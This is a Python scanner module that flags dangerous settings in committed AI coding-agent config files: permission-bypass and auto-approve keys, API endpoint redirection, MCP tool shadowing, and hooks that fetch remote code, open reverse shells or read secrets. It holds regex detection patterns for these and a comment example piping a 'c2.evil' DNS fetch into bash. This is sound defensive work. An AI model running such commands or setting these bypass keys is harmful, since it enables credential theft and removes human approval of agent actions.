"""Detect dangerous constructs in committed AI-agent config files.

A config file that ships in a repo is loaded when a teammate opens the project.
A handful of specific keys turn a single repo-open into standing arbitrary
execution or credential theft — these map to real, patched CVEs:

* ``chat.tools.autoApprove: true``      — VS Code "YOLO mode" (CVE-2025-53773)
* ``defaultMode: "bypassPermissions"``  — skips the workspace-trust gate (CVE-2026-33068)
* ``enableAllProjectMcpServers: true``  — repo self-approves its own MCP servers (CVE-2026-21852)
* ``ANTHROPIC_BASE_URL`` override        — redirects API traffic to a proxy (key theft)
* broad ``Bash(*)`` permission allows    — self-granted arbitrary shell
* hooks / MCP commands piping remote content into a shell, or reading secrets

Detection is structural (parse the JSON, inspect the specific keys) so it does
not over-fire on the key name merely appearing in prose or a comment. The parser
tolerates JSONC (comments, trailing commas) since editor settings use it.
"""
from __future__ import annotations

import re
from typing import Any

_AUTO_APPROVE = "AGENT_CONFIG_AUTO_APPROVE"
_BYPASS = "AGENT_CONFIG_BYPASS_PERMISSIONS"
_ENABLE_ALL_MCP = "AGENT_CONFIG_ENABLE_ALL_MCP"
_BASE_URL = "AGENT_CONFIG_BASE_URL_OVERRIDE"
_BROAD_EXEC = "AGENT_CONFIG_BROAD_EXEC_ALLOW"
_ENV_HIJACK = "AGENT_CONFIG_ENV_HIJACK"
_BROAD_FS_GRANT = "AGENT_CONFIG_BROAD_FS_GRANT"
_HOOK_FETCH = "AGENT_HOOK_SHELL_FETCH"
_HOOK_SECRET = "AGENT_HOOK_SECRET_READ"
_HOOK_LOCAL_SCRIPT = "AGENT_HOOK_LOCAL_SCRIPT"
_HOOK_YOLO = "AGENT_HOOK_YOLO_FLAG"
_HOOK_AUTORUN_EVENT = "AGENT_HOOK_AUTORUN_EVENT"
_API_KEY_HELPER = "AGENT_CONFIG_API_KEY_HELPER"
_SPAWN_HOOK = "AGENT_CONFIG_SPAWN_HOOK"
_MCP_SHELL = "AGENT_MCP_SHELL_COMMAND"
_MCP_TOOL_SHADOW = "AGENT_MCP_TOOL_SHADOW"
_MCP_LOCAL_BINARY = "AGENT_MCP_LOCAL_BINARY"
_MCP_ENV_SECRET = "AGENT_MCP_ENV_SECRET_EXFIL"
_MCP_REMOTE_URL = "AGENT_MCP_REMOTE_URL"

_GUIDELINE = (
    "https://owasp.org/www-project-top-10-for-large-language-model-applications/"
)

# Remote content piped straight into a shell interpreter.
_PIPE_TO_SHELL = re.compile(r"(curl|wget|fetch)\b[^\n|]*\|\s*(sh|bash|zsh|python\d?)\b", re.I)
_SHELL_SUBSHELL_FETCH = re.compile(r"\$\((?:\s*)(curl|wget)\b", re.I)
# Fetch-and-execute, tolerant of intermediate stages: a remote fetcher (incl. dig/
# nslookup used as a covert channel) piped through anything into an interpreter or
# decoder — e.g. `dig +short TXT c2.evil | base64 -d | bash`, `curl x | tee | sh`.
# The two runs are LENGTH-BOUNDED ({0,256}) so this stays linear — an unbounded
# `[^\n]*\|[^\n]*` backtracks quadratically on adversarial input (a committed 1MB
# git hook of a fetcher + many pipes could hang the scanner thread). 256 chars each
# side comfortably spans real fetch→decode→shell chains.
_FETCH_PIPE_EXEC = re.compile(
    r"\b(?:curl|wget|fetch|dig|nslookup|host)\b[^\n]{0,256}\|[^\n]{0,256}\b(?:sh|bash|zsh|python\d?|base64)\b",
    re.I,
)
# Reverse shells: the bash /dev/tcp trick, an interactive shell redirected to a
# socket, netcat -e, and the mkfifo|nc pattern.
_REVERSE_SHELL = re.compile(
    r"(?:/dev/(?:tcp|udp)/|bash\s+-i\b[^\n]*>&|\b(?:nc|ncat)\b[^\n]{0,60}\s-e\b|"
    r"mkfifo\b[^\n]*\|\s*(?:nc|ncat)\b)",
    re.I,
)
# Reads of credential stores / environment.
_SECRET_READ = re.compile(
    r"(~/\.ssh\b|~/\.aws\b|\.env\b|/proc/\d+/environ|\bprintenv\b|"
    r"[A-Z_]*API_KEY\b|[A-Z_]*_TOKEN\b|[A-Z_]*SECRET[A-Z_]*\b)",
)
# An interpreter running a LOCAL script that ships in the repo — the "staged
# payload" pattern (a hook that quietly runs a bundled .mjs/.js/.py/.sh), distinct
# from a hook invoking a standard tool like prettier/eslint. Length-bounded to
# keep the scan linear on adversarial input.
_INTERP_LOCAL_FILE = re.compile(
    r"\b(?:node|deno|bun|tsx|ts-node|python\d?|ruby|perl|sh|bash|zsh)\b"
    r"\s+[^\n|;&]{0,256}\.(?:mjs|cjs|js|ts|py|rb|pl|sh)\b",
    re.I,
)

# An MCP server ``command`` pointing at a repo-relative path (./, ../) instead
# of a package-manager launcher (npx/uvx/docker) or bare interpreter name; the
# server binary/script is auto-spawned from the repo the moment the config is
# trusted, no package registry or shell-pipe pattern involved.
_LOCAL_CMD_PATH = re.compile(r"^\.{1,2}/\S{1,256}$")

# Permission entries granting effectively-unrestricted shell.
_BROAD_BASH = re.compile(r"^Bash(\(\s*:?\*\s*\))?$")

# `${VAR}` interpolation where VAR looks like a host secret (token/key/secret),
# handed to a third-party MCP server's env: the server receives the live
# credential value on every launch.
_ENV_SECRET_INTERP = re.compile(r"\$\{[A-Za-z0-9_]{0,64}(?:TOKEN|SECRET|KEY)[A-Za-z0-9_]{0,64}\}", re.I)

# A remote MCP server URL whose host is a bare IPv4 address rather than a
# named, reviewable host.
_RAW_IP_HOST = re.compile(r"^https?://(?:\d{1,3}\.){3}\d{1,3}(?::\d+)?(?:/|$)")

# Header names that carry a bearer credential.
_AUTH_HEADER_NAME = re.compile(r"^(?:authorization|x-api-key|.*token.*)$", re.I)

# A hook driving an installed agent CLI with guardrails off (the Nx/s1ngularity
# exfil pattern). The disabling flag has no benign use in an automated hook.
_AGENT_YOLO = re.compile(
    r"--dangerously-skip-permissions\b|--yolo\b|--trust-all-tools\b|--dangerously-allow-all\b",
    re.I,
)


def _cmd_is_dangerous(cmd: str) -> bool:
    """True if a config-supplied command fetches+runs remote code, opens a reverse
    shell, reads secrets, runs a bundled local script, or drives an agent CLI with
    guardrails off."""
    return bool(
        _PIPE_TO_SHELL.search(cmd) or _SHELL_SUBSHELL_FETCH.search(cmd)
        or _FETCH_PIPE_EXEC.search(cmd) or _REVERSE_SHELL.search(cmd)
        or _SECRET_READ.search(cmd) or _INTERP_LOCAL_FILE.search(cmd)
        or _AGENT_YOLO.search(cmd)
    )


def _strip_jsonc(text: str) -> str:
    """Remove // and /* */ comments and trailing commas, respecting strings."""
    out: list[str] = []
    i, n = 0, len(text)
    in_str = False
    while i < n:
        ch = text[i]
        if in_str:
            out.append(ch)
            if ch == "\\" and i + 1 < n:
                out.append(text[i + 1])
                i += 2
                continue
            if ch == '"':
                in_str = False
            i += 1
            continue
        if ch == '"':
            in_str = True
            out.append(ch)
            i += 1
            continue
        if ch == "/" and i + 1 < n and text[i + 1] == "/":
            i += 2
            while i < n and text[i] != "\n":
                i += 1
            continue
        if ch == "/" and i + 1 < n and text[i + 1] == "*":
            i += 2
            while i + 1 < n and not (text[i] == "*" and text[i + 1] == "/"):
                i += 1
            i += 2
            continue
        out.append(ch)
        i += 1
    cleaned = "".join(out)
    return re.sub(r",(\s*[}\]])", r"\1", cleaned)


def _load(text: str) -> Any | None:
    import json
    try:
        return json.loads(text)
    except json.JSONDecodeError:
        try:
            return json.loads(_strip_jsonc(text))
        except json.JSONDecodeError:
            return None


def _line_of(text: str, needle: str) -> int:
    idx = text.find(needle)
    if idx < 0:
        return 1
    return text.count("\n", 0, idx) + 1


def _finding(rule_id: str, severity: str, title: str, rel_path: str, line: int,
             resource: str, evidence: dict) -> dict:
    import hashlib
    fp = hashlib.sha1(f"agent:{rel_path}:{rule_id}:{resource}".encode()).hexdigest()[:16]
    return {
        "check_id": rule_id,
        "title": title,
        "severity": severity,
        "file": rel_path,
        "line": line,
        "resource": resource,
        "guideline": _GUIDELINE,
        "fingerprint": fp,
        "evidence": evidence,
    }


def _nested(data: dict, *path: str) -> Any:
    """Read a value by nested keys, also honouring a flat dotted key."""
    dotted = ".".join(path)
    if isinstance(data, dict) and dotted in data:
        return data[dotted]
    cur: Any = data
    for key in path:
        if not isinstance(cur, dict) or key not in cur:
            return None
        cur = cur[key]
    return cur


def _walk_strings(node: Any):
    if isinstance(node, str):
        yield node
    elif isinstance(node, dict):
        for v in node.values():
            yield from _walk_strings(v)
    elif isinstance(node, list):
        for v in node:
            yield from _walk_strings(v)


# Claude Code hook events that fire on their own: no tool call, no user
# action, so a dangerous command here has no approval gate at all, unlike
# PreToolUse/PostToolUse which at least run alongside a tool invocation.
_AUTORUN_HOOK_EVENTS = frozenset({
    "SessionStart", "UserPromptSubmit", "Stop", "SubagentStop",
    "SessionEnd", "Notification", "PreCompact",
})


def _check_hook_command(cmd: str, rel_path: str, text: str) -> list[dict]:
    if (_PIPE_TO_SHELL.search(cmd) or _SHELL_SUBSHELL_FETCH.search(cmd)
            or _FETCH_PIPE_EXEC.search(cmd) or _REVERSE_SHELL.search(cmd)):
        return [_finding(
            _HOOK_FETCH, "critical",
            f"Agent hook pipes remote content into a shell in {rel_path}",
            rel_path, _line_of(text, cmd[:40]), _HOOK_FETCH,
            {"command": cmd[:200]},
        )]
    if _AGENT_YOLO.search(cmd):
        return [_finding(
            _HOOK_YOLO, "critical",
            f"Agent hook drives an agent CLI with permission guardrails disabled in {rel_path}",
            rel_path, _line_of(text, cmd[:40]), _HOOK_YOLO,
            {"command": cmd[:200]},
        )]
    if _SECRET_READ.search(cmd):
        return [_finding(
            _HOOK_SECRET, "high",
            f"Agent hook reads credentials/environment in {rel_path}",
            rel_path, _line_of(text, cmd[:40]), _HOOK_SECRET,
            {"command": cmd[:200]},
        )]
    if _INTERP_LOCAL_FILE.search(cmd):
        return [_finding(
            _HOOK_LOCAL_SCRIPT, "high",
            f"Agent hook auto-runs a bundled local script (staged payload) in {rel_path}",
            rel_path, _line_of(text, cmd[:40]), _HOOK_LOCAL_SCRIPT,
            {"command": cmd[:200]},
        )]
    return []


def _check_hooks(data: dict, rel_path: str, text: str) -> list[dict]:
    findings: list[dict] = []
    hooks = data.get("hooks")
    if isinstance(hooks, dict):
        for event, cfg in hooks.items():
            for cmd in _walk_strings(cfg):
                findings.extend(_check_hook_command(cmd, rel_path, text))
                if event in _AUTORUN_HOOK_EVENTS and _cmd_is_dangerous(cmd):
                    findings.append(_finding(
                        _HOOK_AUTORUN_EVENT, "critical",
                        f"Agent hook under {event} runs with no tool call or user action in {rel_path}",
                        rel_path, _line_of(text, cmd[:40]), f"{_HOOK_AUTORUN_EVENT}:{event}",
                        {"event": event, "command": cmd[:200]},
                    ))
    status_line = data.get("statusLine")
    if isinstance(status_line, dict):
        cmd = status_line.get("command")
        if isinstance(cmd, str) and cmd.strip() and _cmd_is_dangerous(cmd):
            findings.append(_finding(
                _HOOK_AUTORUN_EVENT, "critical",
                f"Agent statusLine.command runs repeatedly outside tool approval in {rel_path}",
                rel_path, _line_of(text, "statusLine"), f"{_HOOK_AUTORUN_EVENT}:statusLine",
                {"command": cmd[:200]},
            ))
    return findings


def _check_api_key_helper(data: dict, rel_path: str, text: str) -> list[dict]:
    """``apiKeyHelper`` runs a shell command every time the agent starts to mint an
    API key — pre-consent auto-exec, and credential-adjacent by definition."""
    helper = data.get("apiKeyHelper")
    if not isinstance(helper, str) or not helper.strip():
        return []
    severity = "critical" if _cmd_is_dangerous(helper) else "high"
    return [_finding(
        _API_KEY_HELPER, severity,
        f"Committed config sets apiKeyHelper, which auto-runs a command pre-consent in {rel_path}",
        rel_path, _line_of(text, "apiKeyHelper"), _API_KEY_HELPER,
        {"command": helper[:200]},
    )]


def _check_env_base_url(data: dict, rel_path: str, text: str) -> list[dict]:
    env = data.get("env")
    if isinstance(env, dict) and "ANTHROPIC_BASE_URL" in env:
        return [_finding(
            _BASE_URL, "high",
            f"Committed config overrides ANTHROPIC_BASE_URL in {rel_path}",
            rel_path, _line_of(text, "ANTHROPIC_BASE_URL"), _BASE_URL,
            {"value": str(env.get("ANTHROPIC_BASE_URL"))[:200]},
        )]
    return []


# Env vars that hijack what code runs, not merely how it behaves: a PATH
# prepend swaps out which binary "git"/"node"/etc. resolves to, and the rest
# force an interpreter to load an attacker-supplied file on every launch.
_ENV_HIJACK_KEYS = frozenset({"PATH", "NODE_OPTIONS", "BASH_ENV", "PYTHONSTARTUP", "LD_PRELOAD"})


def _check_env_hijack(data: dict, rel_path: str, text: str) -> list[dict]:
    env = data.get("env")
    if not isinstance(env, dict):
        return []
    findings: list[dict] = []
    for key in _ENV_HIJACK_KEYS:
        if key in env:
            findings.append(_finding(
                _ENV_HIJACK, "high",
                f"Committed config sets {key} in env, hijacking what code the agent runs in {rel_path}",
                rel_path, _line_of(text, key), f"{_ENV_HIJACK}:{key}",
                {"key": key, "value": str(env.get(key))[:200]},
            ))
    return findings


# Filesystem roots broad enough that granting them is equivalent to granting
# the whole home directory or the whole disk.
_BROAD_FS_ROOTS = frozenset({"~", "~/.ssh", "~/.aws", "/"})


def _is_broad_fs_grant(entry: str) -> bool:
    norm = entry.strip()
    if norm != "/":
        norm = norm.rstrip("/")
    return norm in _BROAD_FS_ROOTS


def _check_broad_fs_grant(data: dict, rel_path: str, text: str) -> list[dict]:
    dirs = _nested(data, "permissions", "additionalDirectories")
    if not isinstance(dirs, list):
        return []
    return [
        _finding(
            _BROAD_FS_GRANT, "high",
            f"Committed config grants agent access to {entry} via additionalDirectories in {rel_path}",
            rel_path, _line_of(text, entry), f"{_BROAD_FS_GRANT}:{entry}",
            {"path": entry},
        )
        for entry in dirs
        if isinstance(entry, str) and _is_broad_fs_grant(entry)
    ]


def _check_claude_settings(data: dict, rel_path: str, text: str) -> list[dict]:
    findings: list[dict] = []
    mode = _nested(data, "defaultMode") or _nested(data, "permissions", "defaultMode")
    if mode == "bypassPermissions":
        findings.append(_finding(
            _BYPASS, "critical",
            f"Committed config sets permission mode bypassPermissions in {rel_path}",
            rel_path, _line_of(text, "bypassPermissions"), _BYPASS,
            {"defaultMode": "bypassPermissions"},
        ))
    if _nested(data, "enableAllProjectMcpServers") is True:
        findings.append(_finding(
            _ENABLE_ALL_MCP, "high",
            f"Committed config auto-enables all project MCP servers in {rel_path}",
            rel_path, _line_of(text, "enableAllProjectMcpServers"), _ENABLE_ALL_MCP,
            {"enableAllProjectMcpServers": True},
        ))
    allow = _nested(data, "permissions", "allow")
    if isinstance(allow, list):
        for entry in allow:
            if isinstance(entry, str) and _BROAD_BASH.match(entry.strip()):
                findings.append(_finding(
                    _BROAD_EXEC, "high",
                    f"Permission allow-list grants unrestricted shell ({entry}) in {rel_path}",
                    rel_path, _line_of(text, entry), _BROAD_EXEC,
                    {"allow": entry},
                ))
    findings.extend(_check_env_base_url(data, rel_path, text))
    findings.extend(_check_env_hijack(data, rel_path, text))
    findings.extend(_check_broad_fs_grant(data, rel_path, text))
    findings.extend(_check_api_key_helper(data, rel_path, text))
    findings.extend(_check_hooks(data, rel_path, text))
    return findings


def _check_vscode_settings(data: dict, rel_path: str, text: str) -> list[dict]:
    if _nested(data, "chat", "tools", "autoApprove") is True:
        return [_finding(
            _AUTO_APPROVE, "critical",
            f"VS Code config auto-approves all agent tool calls in {rel_path}",
            rel_path, _line_of(text, "autoApprove"), _AUTO_APPROVE,
            {"chat.tools.autoApprove": True},
        )]
    return []


def _check_mcp(data: dict, rel_path: str, text: str) -> list[dict]:
    findings: list[dict] = []
    servers = data.get("servers") or data.get("mcpServers")
    if isinstance(servers, dict):
        for name, spec in servers.items():
            if not isinstance(spec, dict):
                continue
            parts = [str(spec.get("command") or "")]
            args = spec.get("args")
            if isinstance(args, list):
                parts.extend(str(a) for a in args)
            joined = " ".join(parts)
            command = str(spec.get("command") or "").strip()
            if _PIPE_TO_SHELL.search(joined) or _SHELL_SUBSHELL_FETCH.search(joined) or \
                    _REVERSE_SHELL.search(joined) or _FETCH_PIPE_EXEC.search(joined) or \
                    re.search(r"\b(bash|sh|zsh)\s+-c\b", joined):
                findings.append(_finding(
                    _MCP_SHELL, "high",
                    f"MCP server '{name}' launches a shell / fetches remote code in {rel_path}",
                    rel_path, _line_of(text, str(name)), f"server:{name}",
                    {"command": joined[:200]},
                ))
            elif _LOCAL_CMD_PATH.match(command):
                findings.append(_finding(
                    _MCP_LOCAL_BINARY, "high",
                    f"MCP server '{name}' auto-spawns a repo-local script/binary in {rel_path}",
                    rel_path, _line_of(text, str(name)), f"server:{name}",
                    {"command": joined[:200]},
                ))
            env = spec.get("env")
            if isinstance(env, dict):
                if "ANTHROPIC_BASE_URL" in env:
                    findings.append(_finding(
                        _BASE_URL, "high",
                        f"MCP server '{name}' overrides ANTHROPIC_BASE_URL in {rel_path}",
                        rel_path, _line_of(text, "ANTHROPIC_BASE_URL"), f"baseurl:{name}",
                        {"value": str(env.get("ANTHROPIC_BASE_URL"))[:200]},
                    ))
                for env_key, env_val in env.items():
                    if isinstance(env_val, str) and _ENV_SECRET_INTERP.search(env_val):
                        findings.append(_finding(
                            _MCP_ENV_SECRET, "high",
                            f"MCP server '{name}' env interpolates a host secret ({env_key}) in {rel_path}",
                            rel_path, _line_of(text, str(env_key)), f"{_MCP_ENV_SECRET}:{name}:{env_key}",
                            {"key": str(env_key), "value": env_val[:200]},
                        ))
            findings.extend(_check_mcp_remote_url(name, spec, rel_path, text))
    findings.extend(_check_env_base_url(data, rel_path, text))
    findings.extend(_check_tool_shadowing(data, rel_path, text))
    return findings


def _check_mcp_remote_url(name: str, spec: dict, rel_path: str, text: str) -> list[dict]:
    url = spec.get("url")
    if not isinstance(url, str) or not url.strip():
        return []
    server_type = spec.get("type")
    if server_type not in ("sse", "http") and not url.strip().lower().startswith("http"):
        return []
    url = url.strip()
    findings: list[dict] = []
    if url.lower().startswith("http://"):
        findings.append(_finding(
            _MCP_REMOTE_URL, "high",
            f"MCP server '{name}' uses a non-HTTPS remote URL in {rel_path}",
            rel_path, _line_of(text, url[:60]), f"{_MCP_REMOTE_URL}:{name}:scheme",
            {"url": url[:200]},
        ))
    elif _RAW_IP_HOST.match(url):
        findings.append(_finding(
            _MCP_REMOTE_URL, "medium",
            f"MCP server '{name}' points at a raw IP address in {rel_path}",
            rel_path, _line_of(text, url[:60]), f"{_MCP_REMOTE_URL}:{name}:ip",
            {"url": url[:200]},
        ))
    headers = spec.get("headers")
    if isinstance(headers, dict):
        for header_name, header_val in headers.items():
            if isinstance(header_name, str) and _AUTH_HEADER_NAME.match(header_name.strip()) \
                    and isinstance(header_val, str) and header_val.strip():
                findings.append(_finding(
                    _MCP_REMOTE_URL, "high",
                    f"MCP server '{name}' hardcodes an auth header ({header_name}) in {rel_path}",
                    rel_path, _line_of(text, header_name), f"{_MCP_REMOTE_URL}:{name}:{header_name}",
                    {"header": header_name},
                ))
    return findings


def _collect_tool_names(node: Any, acc: list[str]) -> None:
    """Collect tool names from any ``{"tools": [{"name": ...}]}`` arrays."""
    if isinstance(node, dict):
        tools = node.get("tools")
        if isinstance(tools, list):
            for t in tools:
                if isinstance(t, dict) and isinstance(t.get("name"), str):
                    acc.append(t["name"])
        for v in node.values():
            _collect_tool_names(v, acc)
    elif isinstance(node, list):
        for v in node:
            _collect_tool_names(v, acc)


def _check_tool_shadowing(data: dict, rel_path: str, text: str) -> list[dict]:
    """Flag a tool name defined more than once — the later definition shadows the
    earlier, letting a malicious server hijack a trusted tool (e.g. redefining
    ``read_file`` to exfiltrate). Only fires on an actual duplicate, so it adds no
    noise when tool definitions are absent."""
    names: list[str] = []
    _collect_tool_names(data, names)
    seen: set[str] = set()
    dupes: list[str] = []
    for n in names:
        if n in seen and n not in dupes:
            dupes.append(n)
        seen.add(n)
    return [
        _finding(
            _MCP_TOOL_SHADOW, "high",
            f"MCP tool name '{n}' is defined more than once in {rel_path} (tool shadowing)",
            rel_path, _line_of(text, f'"{n}"'), f"tool:{n}",
            {"tool": n},
        )
        for n in dupes
    ]


def _load_yaml(text: str) -> Any | None:
    import yaml
    try:
        return yaml.safe_load(text)
    except Exception:  # noqa: BLE001 — malformed YAML → nothing to inspect
        return None


def _load_toml(text: str) -> Any | None:
    import tomllib
    try:
        return tomllib.loads(text)
    except (tomllib.TOMLDecodeError, ValueError):
        return None


def _check_cursor_permissions(data: dict, rel_path: str, text: str) -> list[dict]:
    """`.cursor/permissions.json` is committed per-repo and CONCATENATED into the
    user's own allowlist, so a repo can only widen what auto-runs — the injection
    vector."""
    findings: list[dict] = []
    term = data.get("terminalAllowlist")
    if isinstance(term, list) and term:
        findings.append(_finding(
            _BROAD_EXEC, "high",
            f"Committed Cursor terminalAllowlist auto-approves shell commands in {rel_path}",
            rel_path, _line_of(text, "terminalAllowlist"), _BROAD_EXEC,
            {"entries": [str(t)[:60] for t in term[:8]]},
        ))
    auto = data.get("autoRun")
    allow = auto.get("allow_instructions") if isinstance(auto, dict) else None
    if isinstance(allow, list) and allow:
        findings.append(_finding(
            _AUTO_APPROVE, "high",
            f"Committed Cursor autoRun.allow_instructions auto-runs actions in {rel_path}",
            rel_path, _line_of(text, "allow_instructions"), _AUTO_APPROVE,
            {"entries": [str(a)[:60] for a in allow[:8]]},
        ))
    mcp_allow = data.get("mcpAllowlist")
    if isinstance(mcp_allow, list) and mcp_allow:
        findings.append(_finding(
            _AUTO_APPROVE, "high",
            f"Committed Cursor mcpAllowlist auto-approves MCP servers in {rel_path}",
            rel_path, _line_of(text, "mcpAllowlist"), f"{_AUTO_APPROVE}:mcp",
            {"entries": [str(a)[:60] for a in mcp_allow[:8]]},
        ))
    return findings


def _check_gemini_settings(data: dict, rel_path: str, text: str) -> list[dict]:
    findings = _check_mcp(data, rel_path, text)
    if data.get("autoAccept") is True:
        findings.append(_finding(
            _AUTO_APPROVE, "high",
            f"Committed Gemini autoAccept runs tools without confirmation in {rel_path}",
            rel_path, _line_of(text, "autoAccept"), _AUTO_APPROVE, {},
        ))
    servers = data.get("mcpServers")
    if isinstance(servers, dict):
        for name, spec in servers.items():
            if isinstance(spec, dict) and spec.get("trust") is True:
                findings.append(_finding(
                    _AUTO_APPROVE, "high",
                    f"Gemini MCP server '{name}' is trusted, bypassing tool confirmations in {rel_path}",
                    rel_path, _line_of(text, "trust"), f"{_AUTO_APPROVE}:{name}",
                    {"server": str(name)},
                ))
    return findings


def _check_aider(data: dict, rel_path: str, text: str) -> list[dict]:
    findings: list[dict] = []
    if data.get("yes-always") is True:
        findings.append(_finding(
            _AUTO_APPROVE, "high",
            f"Committed Aider yes-always auto-confirms every prompt in {rel_path}",
            rel_path, _line_of(text, "yes-always"), _AUTO_APPROVE, {},
        ))
    api_base = data.get("openai-api-base")
    if isinstance(api_base, str) and api_base.strip():
        findings.append(_finding(
            _BASE_URL, "high",
            f"Committed Aider openai-api-base redirects the LLM endpoint in {rel_path}",
            rel_path, _line_of(text, "openai-api-base"), _BASE_URL,
            {"value": api_base[:200]},
        ))
    return findings


def _check_amazonq_agent(data: dict, rel_path: str, text: str) -> list[dict]:
    findings = _check_mcp(data, rel_path, text)
    tools = data.get("tools")
    if isinstance(tools, list) and "*" in tools:
        findings.append(_finding(
            _BROAD_EXEC, "high",
            f'Amazon Q agent grants all tools ("*") in {rel_path}',
            rel_path, _line_of(text, "tools"), _BROAD_EXEC, {},
        ))
    allowed = data.get("allowedTools")
    if isinstance(allowed, list) and any("*" in str(a) for a in allowed):
        findings.append(_finding(
            _AUTO_APPROVE, "high",
            f"Amazon Q agent auto-approves tools via a wildcard allowedTools entry in {rel_path}",
            rel_path, _line_of(text, "allowedTools"), _AUTO_APPROVE,
            {"entries": [str(a)[:60] for a in allowed[:8]]},
        ))
    hooks = data.get("hooks")
    spawn = hooks.get("agentSpawn") if isinstance(hooks, dict) else None
    if isinstance(spawn, list):
        for h in spawn:
            cmd = h.get("command") if isinstance(h, dict) else None
            if isinstance(cmd, str) and cmd.strip():
                sev = "critical" if _cmd_is_dangerous(cmd) else "high"
                findings.append(_finding(
                    _SPAWN_HOOK, sev,
                    f"Amazon Q agent runs a command automatically on spawn in {rel_path}",
                    rel_path, _line_of(text, cmd[:40]), _SPAWN_HOOK,
                    {"command": cmd[:200]},
                ))
    return findings


def _check_codex_config(data: dict, rel_path: str, text: str) -> list[dict]:
    """Codex CLI's ``config.toml`` unattended-execution and notify-hook keys."""
    findings: list[dict] = []
    if data.get("sandbox_mode") == "danger-full-access":
        findings.append(_finding(
            _BYPASS, "critical",
            f"Codex config disables the sandbox via sandbox_mode = \"danger-full-access\" in {rel_path}",
            rel_path, _line_of(text, "danger-full-access"), _BYPASS, {},
        ))
    if data.get("approval_policy") == "never":
        findings.append(_finding(
            _AUTO_APPROVE, "high",
            f"Codex config auto-approves every action via approval_policy = \"never\" in {rel_path}",
            rel_path, _line_of(text, "approval_policy"), _AUTO_APPROVE, {},
        ))
    notify = data.get("notify")
    if isinstance(notify, list) and notify:
        cmd = " ".join(str(p) for p in notify)
        sev = "critical" if _cmd_is_dangerous(cmd) else "high"
        findings.append(_finding(
            _SPAWN_HOOK, sev,
            f"Codex config runs a command automatically on every notification in {rel_path}",
            rel_path, _line_of(text, "notify"), _SPAWN_HOOK,
            {"command": cmd[:200]},
        ))
    return findings


_GEMINI_SHELL_TOKEN = re.compile(r"!\{[^{}\n]{0,256}\}")


def _check_gemini_command(data: dict, rel_path: str, text: str) -> list[dict]:
    """A Gemini CLI custom command's ``prompt`` can embed ``!{shell command}``,
    executed when the slash command runs."""
    prompt = data.get("prompt")
    if not isinstance(prompt, str):
        return []
    findings: list[dict] = []
    for m in _GEMINI_SHELL_TOKEN.finditer(prompt):
        shell_cmd = m.group(0)[2:-1]
        if _cmd_is_dangerous(shell_cmd):
            findings.append(_finding(
                _SPAWN_HOOK, "critical",
                f"Gemini custom command embeds a dangerous shell token in {rel_path}",
                rel_path, _line_of(text, m.group(0)[:40]), _SPAWN_HOOK,
                {"command": shell_cmd[:200]},
            ))
    return findings


def _check_zed_tasks(data: list, rel_path: str, text: str) -> list[dict]:
    """Zed's ``tasks.json`` is a JSON array of {command, args} the developer
    triggers from the command palette, so a dangerous committed command is a
    one-click-away foothold."""
    findings: list[dict] = []
    for task in data:
        if not isinstance(task, dict):
            continue
        cmd = task.get("command")
        if not isinstance(cmd, str) or not cmd.strip():
            continue
        args = task.get("args")
        joined = cmd + (" " + " ".join(str(a) for a in args) if isinstance(args, list) else "")
        if _cmd_is_dangerous(joined):
            findings.append(_finding(
                _SPAWN_HOOK, "high",
                f"Zed task '{task.get('label', cmd)[:60]}' runs a dangerous command in {rel_path}",
                rel_path, _line_of(text, cmd[:40]), _SPAWN_HOOK,
                {"command": joined[:200]},
            ))
    return findings


def scan_config(rel_path: str, text: str) -> list[dict]:
    """Inspect one agent config file; return findings for dangerous constructs."""
    base = rel_path.rsplit("/", 1)[-1]
    if base == ".aider.conf.yml":
        data = _load_yaml(text)
        return _check_aider(data, rel_path, text) if isinstance(data, dict) else []
    if rel_path == ".codex/config.toml":
        data = _load_toml(text)
        return _check_codex_config(data, rel_path, text) if isinstance(data, dict) else []
    if rel_path.startswith(".gemini/commands/") and base.endswith(".toml"):
        data = _load_toml(text)
        return _check_gemini_command(data, rel_path, text) if isinstance(data, dict) else []
    if rel_path == ".zed/tasks.json":
        data = _load(text)
        return _check_zed_tasks(data, rel_path, text) if isinstance(data, list) else []
    data = _load(text)
    if not isinstance(data, dict):
        return []
    if base in (".mcp.json", "mcp.json"):  # .mcp.json, .vscode/.cursor/.amazonq/mcp.json
        return _check_mcp(data, rel_path, text)
    if rel_path == ".vscode/settings.json":
        return _check_vscode_settings(data, rel_path, text)
    if base in ("settings.json", "settings.local.json") and rel_path.startswith(".claude/"):
        return _check_claude_settings(data, rel_path, text)
    if rel_path == ".cursor/permissions.json":
        return _check_cursor_permissions(data, rel_path, text)
    if rel_path == ".gemini/settings.json":
        return _check_gemini_settings(data, rel_path, text)
    if rel_path.startswith(".amazonq/cli-agents/") and base.endswith(".json"):
        return _check_amazonq_agent(data, rel_path, text)
    return []
